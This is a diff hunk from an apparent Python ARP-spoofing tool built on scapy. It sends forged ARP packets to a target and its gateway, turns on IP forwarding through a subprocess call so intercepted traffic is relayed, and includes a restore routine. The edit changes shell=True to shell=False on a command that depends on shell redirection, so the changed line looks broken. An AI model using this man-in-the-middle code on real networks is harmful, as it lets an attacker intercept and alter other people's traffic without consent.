@@ -43,7 +43,7 @@ def spoof(target_ip, gateway_ip):
     # print(packet.show())
     scapy.send(packet, verbose=False)
     scapy.send(packet2, verbose=False)
-    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
+    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=False)
 
 def restore ():
     packet3 = scapy.ARP(op=2, pdst=desired_ip.target_ip, hwdst=get_mac(desired_ip.target_ip), psrc=desired_ip.gateway_ip,hwsrc=get_mac(desired_ip.gateway_ip))
